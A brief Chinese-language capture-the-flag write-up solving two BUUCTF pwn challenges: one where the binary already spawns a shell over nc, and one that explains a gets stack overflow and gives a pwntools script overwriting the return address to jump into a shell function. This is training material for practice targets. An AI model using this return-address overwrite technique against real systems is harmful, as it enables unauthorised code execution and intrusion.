# buuctf test_your_nc

ida64打开之后找到main,主函数查看发现`system(/bin/sh)`

可以直接执行,所以nc一下,直接输入命令

# buuctf rip

checksec一下,发现没有任何保护,用ida64打开观察main函数,发现有gets函数,很明显存在堆栈溢出

gets_s（buffer,size）函数：从标准输入中读取数据，size表示的最多读取的数量，在这里是argv，没有定义是多大，所以我们就可以无限的输入。但是可以发现buffer就只有0xF字节的大小，输入超过0xF个字节以后，你就会溢出，你会覆盖返回地址。所以如果你先填充字节，然后修改掉返回地址就可以调转到你想要跳转的地方。


发现s字符串是15个字节,再加上rbp的8个字节

总共需要覆盖24个字节

同时找到一个命令执行函数,可以编写脚本

```
from pwn import *  
p=remote("node5.buuoj.cn",28061) #靶机地址和端口
payload=b'A'*15+b'B'*8+p64(0x401186+1)
#char s的15个字节+RBP的8字节+fun函数入口地址，+1为了堆栈平衡，p64()发送数据时，是发送的字节流，也就是比特流（二进制流）。
p.sendline(payload)
p.interactive()
```